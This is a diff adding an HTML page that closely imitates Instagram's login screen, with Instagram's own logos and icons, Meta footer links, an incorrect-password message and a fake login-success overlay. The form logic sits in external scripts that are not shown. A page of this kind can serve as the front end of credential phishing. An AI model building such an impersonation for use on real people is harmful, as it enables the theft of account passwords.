@@ -1,0 +1,123 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Instagram</title>
+  <link rel="stylesheet" href="css/reset.css">
+  <link rel="stylesheet" href="css/main.css">
+  <link rel="stylesheet" href="css/responsive.css">
+  <link rel="shortcut icon" type="image/x-icon" href="https://static.cdninstagram.com/rsrc.php/v3/yt/r/30PrGfR3xhB.png">
+  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@300;400;500;700&display=swap" rel="stylesheet">
+</head>
+<body>
+  <div class="container">
+    <div class="login-container">
+      <div class="login-box">
+        <div class="header">
+          <img src="https://www.instagram.com/static/images/web/logged_out_wordmark.png/7a252de00b20.png" alt="Instagram" class="logo">
+        </div>
+        
+        <form id="loginForm" class="login-form">
+          <div class="form-group">
+            <div class="input-container">
+              <input type="text" id="username" name="username" required>
+              <label for="username">Phone number, username, or email</label>
+            </div>
+          </div>
+          
+          <div class="form-group">
+            <div class="input-container" id="passwordContainer">
+              <input type="password" id="password" name="password" required>
+              <label for="password">Password</label>
+            </div>
+            <button type="button" id="showPassword" class="show-password">Show</button>
+            <div id="passwordError" class="error-message" style="display: none;">
+              The password you entered is incorrect. Please try again.
+            </div>
+          </div>
+          
+          
+          <button type="submit" id="loginButton" class="login-button" disabled>Log In</button>
+          
+          <div class="divider">
+            <span class="line"></span>
+            <span class="or">OR</span>
+            <span class="line"></span>
+          </div>
+          
+          <div class="facebook-login">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/y5/r/TJztmXpWTmS.png" alt="Facebook icon" class="facebook-icon">
+            <span>Log in with Facebook</span>
+          </div>
+          
+          <div class="forgot-password">
+            <a href="#">Forgot password?</a>
+          </div>
+        </form>
+      </div>
+      
+      <div class="signup-box">
+        <p>Don't have an account? <a href="#">Sign up</a></p>
+      </div>
+      
+      <div class="app-download">
+        <p>Get the app.</p>
+        <div class="app-links">
+          <a href="#" class="app-link">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yr/r/fDjwyLC88oO.png" alt="Download on App Store">
+          </a>
+          <a href="#" class="app-link">
+            <img src="https://static.cdninstagram.com/rsrc.php/v3/yv/r/_UbeIRgTpG-.png" alt="Get it on Google Play">
+          </a>
+        </div>
+      </div>
+    </div>
+    
+    <footer class="footer">
+      <div class="links">
+        <a href="#">Meta</a>
+        <a href="#">About</a>
+        <a href="#">Blog</a>
+        <a href="#">Jobs</a>
+        <a href="#">Help</a>
+        <a href="#">API</a>
+        <a href="#">Privacy</a>
+        <a href="#">Terms</a>
+        <a href="#">Top Accounts</a>
+        <a href="#">Locations</a>
+        <a href="#">Instagram Lite</a>
+        <a href="#">Threads</a>
+        <a href="#">Contact Uploading & Non-Users</a>
+        <a href="#">Meta Verified</a>
+      </div>
+      
+      <div class="copyright">
+        <select aria-label="Switch Display Language">
+          <option value="en">English</option>
+          <option value="es">Español</option>
+          <option value="fr">Français</option>
+          <option value="de">Deutsch</option>
+          <option value="it">Italiano</option>
+        </select>
+        <span>© 2025 Instagram from Meta</span>
+      </div>
+    </footer>
+  </div>
+  
+  <div id="successOverlay" class="success-overlay">
+    <div class="success-content">
+      <svg class="checkmark" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 52 52">
+        <circle class="checkmark-circle" cx="26" cy="26" r="25" fill="none"/>
+        <path class="checkmark-check" fill="none" d="M14.1 27.2l7.1 7.2 16.7-16.8"/>
+      </svg>
+      <p>Login Successful!</p>
+      <p class="redirect-text">Redirecting to your feed...</p>
+    </div>
+  </div>
+
+  <script src="js/form-validator.js"></script>
+  <script src="js/password-toggle.js"></script>
+  <script src="js/login-handler.js"></script>
+</body>
+</html>
